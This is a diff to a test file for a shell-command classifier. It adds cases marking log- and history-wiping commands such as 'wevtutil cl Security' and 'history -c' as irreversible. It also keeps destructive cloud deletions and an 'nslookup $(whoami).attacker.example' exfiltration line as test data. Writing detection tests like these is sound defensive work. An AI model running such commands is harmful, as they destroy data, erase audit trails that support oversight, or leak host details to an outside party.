@@ -129,6 +129,13 @@ def test_catastrophic(line):
     "heroku apps:destroy --app x --confirm x",
     "firebase firestore:delete --all-collections",
     "bq rm -r -f dataset",
+
+    # Erasing logs or history (#171)
+    "history -c",
+    "Clear-History",
+    "wevtutil cl Security",
+    "journalctl --vacuum-time=1s",
+    "tmutil disable",
 ])
 def test_irreversible(line):
     assert kind(line) == "irreversible", commands.read(line).summary()
@@ -211,6 +218,13 @@ def test_no_false_alarm(line):
     "heroku apps:info",
     "firebase firestore:indexes",
     "bq ls",
+
+    # Normal history and log reading (#171)
+    "history",
+    "history | grep ssh",
+    "journalctl -u nginx --since today",
+    "wevtutil qe Security /c:5",
+    "tmutil status",
 ])
 def test_everyday_work_is_not_held(line):
     assert kind(line) in ("other", "read_only"), commands.read(line).summary()
@@ -226,6 +240,7 @@ def test_summary_explains():
     assert "APFS" in commands.read("diskutil apfs deleteContainer disk2").summary()
     assert "backup" in commands.read("tmutil delete /Volumes/Backup/x").summary()
     assert "DNS name" in commands.read("nslookup $(whoami).attacker.example").summary()
+    assert "erases the record of what ran" in commands.read("history -c").summary()
 
 
 @pytest.mark.parametrize("line", ["diskutil list", "diskutil info disk2", "diskutil apfs list",
